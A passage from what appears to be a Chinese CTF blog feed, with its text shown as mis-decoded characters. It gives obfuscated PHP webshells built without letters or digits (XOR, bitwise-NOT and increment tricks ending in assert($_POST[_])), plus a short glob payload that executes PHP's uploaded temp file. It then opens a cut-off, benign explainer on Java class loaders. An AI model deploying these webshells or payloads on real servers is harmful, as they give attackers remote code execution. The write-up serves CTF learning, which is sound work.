ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨file_put_contentså‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥getshellã€‚</li></ul><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></div><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>ä½¿ç”¨çš„æ˜¯ä½è¿ç®—é‡Œçš„â€œå–åâ€ï¼Œåˆ©ç”¨çš„æ˜¯UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œæ¯”å¦‚<code>&#39;å’Œ&#39;&#123;2&#125;</code>çš„ç»“æœæ˜¯<code>&quot;\x8c&quot;</code>ï¼Œå…¶å–åå³ä¸ºå­—æ¯<code>s</code>ï¼š</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5802luzjqj209y0bejrs.jpg"                      alt="img"                ><figcaption>img</figcaption></figure></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;ç°&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å’Œ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å’Œ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;çš„&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;åŠ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å§‹&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;ä¿¯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;ç°&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;æ¬¡&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;ç«™&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™ä¸ªç­”æ¡ˆè¿˜åˆ©ç”¨äº†PHPçš„å¼±ç±»å‹ç‰¹æ€§ã€‚å› ä¸ºè¦è·å–<code>&#39;å’Œ&#39;&#123;2&#125;</code>ï¼Œå°±å¿…é¡»æœ‰æ•°å­—2ã€‚è€ŒPHPç”±äºå¼±ç±»å‹è¿™ä¸ªç‰¹æ€§ï¼Œtrueçš„å€¼ä¸º1ï¼Œæ•…<code>true+true==2</code>ï¼Œä¹Ÿå°±æ˜¯<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>ã€‚</p></blockquote><h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5802lcnxij20i2027jrj.jpg"                      alt="14872693882387.jpg"                ><figcaption>14872693882387.jpg</figcaption></figure></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>ï¼Œ<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>â€¦ æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸º<code>a</code>ï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚</p><h4 id="è·å–å­—æ¯a"><a href="#è·å–å­—æ¯a" class="headerlink" title="è·å–å­—æ¯a"></a>è·å–å­—æ¯a</h4><p>åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸º<code>Array</code>,å†å–è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå°±å¯ä»¥è·å¾—â€™Aâ€™äº†ã€‚</p><p>åˆ©ç”¨è¿™ä¸ªæŠ€å·§ï¼Œç¼–å†™äº†å¦‚ä¸‹webshellï¼ˆå› ä¸ºPHPå‡½æ•°æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæ‰§è¡Œçš„æ˜¯<code>ASSERT($_POST[_])</code>ï¼Œæ— éœ€è·å–å°å†™aï¼‰ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure></div><h2 id="æ— æ•°å­—å­—æ¯shellæé«˜ç¯‡"><a href="#æ— æ•°å­—å­—æ¯shellæé«˜ç¯‡" class="headerlink" title="æ— æ•°å­—å­—æ¯shellæé«˜ç¯‡"></a>æ— æ•°å­—å­—æ¯shellæé«˜ç¯‡</h2><p>å¤šäº†ä¸¤ä¸ªé™åˆ¶ï¼š</p><ol><li>webshellé•¿åº¦ä¸è¶…è¿‡35ä½</li><li>é™¤äº†ä¸åŒ…å«å­—æ¯æ•°å­—ï¼Œè¿˜ä¸èƒ½åŒ…å«<code>$</code>å’Œ<code>_</code></li></ol><h3 id="PHP7ä¸‹"><a href="#PHP7ä¸‹" class="headerlink" title="PHP7ä¸‹"></a>PHP7ä¸‹</h3><p>æ‰§è¡ŒåŠ¨æ€å‡½æ•°<code>($a)();</code> (PHP7åæ”¯æŒ)</p><p>e.g. <code>(&#39;phpinfo&#39;)();</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)(); <span class="comment">//phpinfo()</span></span><br></pre></td></tr></table></figure></div><h3 id="PHP5ä¸‹"><a href="#PHP5ä¸‹" class="headerlink" title="PHP5ä¸‹"></a>PHP5ä¸‹</h3><p>Linux shellçŸ¥è¯†ç‚¹ï¼š</p><ol><li>shellä¸‹å¯ä»¥åˆ©ç”¨<code>.</code>æ¥æ‰§è¡Œä»»æ„è„šæœ¬</li><li>Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿</li></ol><blockquote><p><code>. file</code>çš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤</p></blockquote><p>Linuxä¸‹çš„globé€šé…ç¬¦ï¼š</p><ul><li><code>*</code>å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦</li><li><code>?</code>å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</li></ul><blockquote><p><code>/tmp/phpXXXXXX</code>å°±å¯ä»¥è¡¨ç¤ºä¸º<code>/*/?????????</code>æˆ–<code>/???/?????????</code>ã€‚</p></blockquote><p>ä½†è¿™ç§åŒ¹é…çš„ç»“æœè¿‡å¤šï¼Œå‡è®¾è¦æ‰§è¡Œ<code>/tmp/phpcjggLC</code></p><p>globæ”¯æŒç”¨<code>[^x]</code>çš„æ–¹æ³•æ¥æ„é€ â€œè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€,é‚£ä¹ˆï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå§¿åŠ¿å¹²æ‰<code>/bin/run-parts</code>ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/???[^-]?????</span><br></pre></td></tr></table></figure></div><p>è·Ÿæ­£åˆ™è¡¨è¾¾å¼ç±»ä¼¼ï¼Œglobæ”¯æŒåˆ©ç”¨<code>[0-9]</code>æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032329195.jpg"                      alt="image-20220816023000185"                ><figcaption>image-20220816023000185</figcaption></figure></p><p>æ‰€æœ‰åŒ¹é…åˆ°çš„æ–‡ä»¶åéƒ½æ˜¯å°å†™ï¼Œåªæœ‰PHPç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å¤§å†™å­—æ¯ã€‚é‚£ä¹ˆç­”æ¡ˆå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œæˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è¡¨ç¤ºâ€œå¤§å†™å­—æ¯â€çš„globé€šé…ç¬¦ï¼Œå°±èƒ½ç²¾å‡†æ‰¾åˆ°æˆ‘ä»¬è¦æ‰§è¡Œçš„æ–‡ä»¶ã€‚</p><p>ç¿»å¼€asciiç è¡¨ï¼Œå¯è§å¤§å†™å­—æ¯ä½äº<code>@</code>ä¸<code>[</code>ä¹‹é—´,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>[@-[]</code>æ¥è¡¨ç¤ºå¤§å†™å­—æ¯</p><p>æœ€ç»ˆpayload</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`. /???/????????[@-[]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="æ— æ•°å­—å­—æ¯shellçš„ä¸€äº›trick"><a href="#æ— æ•°å­—å­—æ¯shellçš„ä¸€äº›trick" class="headerlink" title="æ— æ•°å­—å­—æ¯shellçš„ä¸€äº›trick"></a>æ— æ•°å­—å­—æ¯shellçš„ä¸€äº›trick</h2><h3 id="è·å–æ•°å­—1-0"><a href="#è·å–æ•°å­—1-0" class="headerlink" title="è·å–æ•°å­—1 0"></a>è·å–æ•°å­—1 0</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(!<span class="string">&#x27;&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(!!<span class="string">&#x27;&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(!<span class="string">&#x27;&#x27;</span>+!!<span class="string">&#x27;&#x27;</span>);<span class="comment">//int(1)</span></span><br><span class="line"><span class="comment">//ç›´æ¥æ”¾ä¸‹æ ‡ä¹Ÿè¡Œ</span></span><br><span class="line"><span class="variable">$____</span>=<span class="variable">$_</span>[!<span class="string">&#x27;&#x27;</span>];<span class="comment">//èµ‹å€¼$_[1]</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[!!<span class="string">&#x27;&#x27;</span>];<span class="comment">//èµ‹å€¼$_[0]</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç±»åŠ è½½æœºåˆ¶</title>
      <link href="/2022/07/02/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/07/02/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="ç±»åŠ è½½"><a href="#ç±»åŠ è½½" class="headerlink" title="ç±»åŠ è½½"></a>ç±»åŠ è½½</h1><h2 id="åŸºæœ¬æœ¯è¯­"><a href="#åŸºæœ¬æœ¯è¯­" class="headerlink" title="åŸºæœ¬æœ¯è¯­"></a>åŸºæœ¬æœ¯è¯­</h2><h3 id="ç±»åŠ è½½å™¨"><a href="#ç±»åŠ è½½å™¨" class="headerlink" title="ç±»åŠ è½½å™¨"></a>ç±»åŠ è½½å™¨</h3><p>ç±»åŠ è½½å™¨ï¼šé€šè¿‡ä¸€ä¸ªç±»å…¨é™å®šåç§°æ¥è·å–å…¶äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆ.classï¼‰æµçš„å·¥å…·ã€‚</p><p>ç±»åŠ è½½å™¨éƒ½æ˜¯æŠ½è±¡ç±»ClassLoaderçš„å­ç±»</p><p>javaç±»ç¼–è¯‘åçš„.classæ–‡ä»¶å¼€å¤´å­—èŠ‚ç æ˜¯cafe babe  ï¼Œå­—èŠ‚ç è¢«ClassLoderåŠ è½½åˆ°JVMä¸­</p><p>Bootstrap ClassLoader æœ€é¡¶å±‚ClassLoader</p><p>å³ä½¿ä¸€ä¸ªClassLoaderç»§æ‰¿äº†ClassLoaderå…¶çˆ¶ç±»ä¹Ÿæ˜¯AppClassLoader</p><h3 id="JVMæ¡†æ¶å›¾"><a href="#JVMæ¡†æ¶å›¾" class="headerlink" title="JVMæ¡†æ¶å›¾"></a>JVMæ¡†æ¶å›¾</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040005015.png"                      alt="image-20221009155611940"                ><figcaption>image-20221009155611940</figcaption></figure></p><blockquote><p>ç¼–è¯‘</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TestHelloWorld.java</span><br></pre></td></tr></table></figure></div><p>åæ±‡ç¼–ç”Ÿæˆå­—èŠ‚ç </p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -c TestHelloWorld</span><br></pre></td></tr></table></figure></div><p>JVMåœ¨æ‰§è¡Œ<code>TestHelloWorld</code>ä¹‹å‰ä¼šå…ˆè§£æclassäºŒè¿›åˆ¶å†…å®¹ï¼ŒJVMæ‰§è¡Œçš„å…¶å®å°±æ˜¯å¦‚ä¸Š<code>javap</code>å‘½ä»¤ç”Ÿæˆçš„å­—èŠ‚ç ã€‚</p></blockquote><h2 id="ClassLoder"><a href="#ClassLoder" class="headerlink" title="ClassLoder"></a>ClassLoder</h2><p>ä¸€åˆ‡çš„Javaç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€Œ<code>ClassLoader</code>çš„ä¸»è¦ä½œç”¨å°±æ˜¯Javaç±»æ–‡ä»¶çš„åŠ è½½ã€‚åœ¨JVMç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯<code>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰</code>ã€<code>Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰</code>ã€<code>App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰</code>ï¼Œ<code>AppClassLoader</code>æ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨<code>AppClassLoader</code>åŠ è½½ç±»ï¼Œ<code>ClassLoader.getSystemClassLoader()</code>è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯<code>AppClassLoader</code>ã€‚</p><blockquote><p>è·å–ç±»åŠ è½½å™¨æ—¶æœ‰æ—¶ä¼šè¿”å›ä¸€ä¸ªnullå¯¹è±¡ï¼Œå¯èƒ½æ˜¯è¯¥ç±»è¢«JVMåˆå§‹åŒ–æ˜¯è¢«<code>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰</code>åŠ è½½ï¼ˆè¯¥ç±»åŠ è½½å™¨å®ç°äºJVMå±‚ï¼Œé‡‡ç”¨C++ç¼–å†™,è·å–è¯¥ç±»åŠ è½½å™¨åŠ è½½çš„ç±»çš„ClassLoaderæ—¶ä¼šè¿”å›null</p></blockquote><p><code>ClassLoader</code>ç±»æœ‰å¦‚ä¸‹æ ¸å¿ƒæ–¹æ³•ï¼š</p><ol><li><code>loadClass</code>ï¼ˆåŠ è½½æŒ‡å®šçš„Javaç±»ï¼‰</li><li><code>findClass</code>ï¼ˆæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»ï¼‰</li><li><code>findLoadedClass</code>ï¼ˆæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»ï¼‰</li><li><code>defineClass</code>ï¼ˆå®šä¹‰ä¸€ä¸ªJavaç±»ï¼‰</li><li><code>resolveClass</code>ï¼ˆé“¾æ¥æŒ‡å®šçš„Javaç±»ï¼‰</li></ol><h2 id="ç±»åŠ è½½æµç¨‹"><a href="#ç±»åŠ è½½æµç¨‹" class="headerlink" title="ç±»åŠ è½½æµç¨‹"></a>ç±»åŠ è½½æµç¨‹</h2><p><code>ClassLoader</code>åŠ è½½<code>com.anbai.sec.classloader.TestHelloWorld</code>ç±»é‡è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ClassLoaderè°ƒç”¨<code>public Class&lt;?&gt; loadClass(String name)</code>æ–¹æ³•åŠ è½½<code>com.anbai.sec.classloader.TestHelloWorld</code>ç±»ã€‚</li><li>è°ƒç”¨<code>findLoadedClass</code>æ–¹æ³•æ£€æŸ¥<code>TestHelloWorld</code>ç±»æ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼Œå¦‚æœJVMå·²åˆå§‹åŒ–è¿‡è¯¥ç±»åˆ™ç›´æ¥è¿”å›ç±»å¯¹è±¡ã€‚</li><li>å¦‚æœåˆ›å»ºå½“å‰<code>ClassLoader</code>æ—¶ä¼ 